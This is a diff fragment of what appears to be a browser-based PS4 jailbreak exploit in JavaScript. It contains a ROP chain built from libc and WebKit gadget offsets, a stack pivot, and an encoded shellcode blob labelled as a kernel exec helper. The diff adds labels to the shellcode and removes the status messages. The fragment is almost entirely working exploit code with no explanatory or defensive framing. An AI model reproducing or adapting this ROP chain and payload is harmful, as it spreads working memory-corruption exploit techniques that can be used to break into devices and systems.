@@ -156691,8 +156691,11 @@ libc_base+755660, //add rax, rcx
 webkit_base+1590618, //mov qword [rax], 0
 libc_base+782311 //pop rsp
 ]);
-db([0, 0]);
+//_kernel_fixup_ret:
+db([0, 0]); // 0x0
+//_kexec_helper_bin:
 db([171806024, 1207959552, 770247, 84869120, 1988839619, 1219315720, 2907179147, 1208518984, 2336777645, 9484, 2303197184, 3284152584]);
+//_kexec_helper_end:
 pivot(ropchain);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
@@ -156700,9 +156703,3 @@ var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
 var _ = malloc_nogc.pop();
-if(main_ret == 179 || main_ret == 0){
-	document.getElementById("progress").innerHTML="PS4 Jailbreak 7.5X Jailbreak Complete !!";
-} else{
-	document.getElementById("progress").innerHTML="PS4 Jailbreak 7.5X Jailbreak Failed, Restart and Start Fresh !!";
-	read_ptr_at(0);
-}
